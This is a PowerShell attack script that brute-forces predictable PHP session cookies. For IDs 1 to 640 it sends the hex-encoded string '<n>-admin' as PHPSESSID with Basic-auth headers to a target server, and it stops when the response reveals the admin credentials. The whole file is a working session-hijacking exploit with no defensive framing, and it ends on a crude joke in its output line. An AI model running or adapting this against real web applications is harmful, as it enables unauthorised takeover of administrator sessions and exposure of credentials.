param (
    [Parameter(Mandatory=$true)]
    [string]$server,
    [Parameter(Mandatory=$true)]
    [string]$username,
    [Parameter(Mandatory=$true)]
    [string]$password
)
$url = $server

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
} 

$correctStr = 'The credentials'

function Convert-StringToHex { #yes this is from gpt
    param (
        [string]$plainText
    )

    # Convert each character to its hexadecimal representation
    $hexString = -join ($plainText.ToCharArray() | ForEach-Object { [byte][char]$_ -as [byte] } | ForEach-Object { $_.ToString("x2") })

    return $hexString
}

for ($i = 1; $i -le 640; $i++) {
    write-host "Session: $i"
    $cookieContainer = New-Object System.Net.CookieContainer

    $plaintextcookie = "$i-admin"
    $hexcookie = Convert-StringToHex -plaintext $plaintextcookie


    $cookie = New-Object System.Net.Cookie("PHPSESSID", $hexcookie, "/", $server)
    $cookieContainer.Add($cookie)
    
    $requestSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
    $requestSession.Cookies = $cookieContainer;

    $commandurl = $url;
    $response = Invoke-WebRequest -Headers $headers -URI $commandurl -WebSession $requestSession;
    
    if ($response.Content -like "*$correctStr*") {
        write-host $response.content `n
        write-host "[admin] => 1"
        write-host "yooooo ur mum: phpSESSID: $i"
        break
    }

}

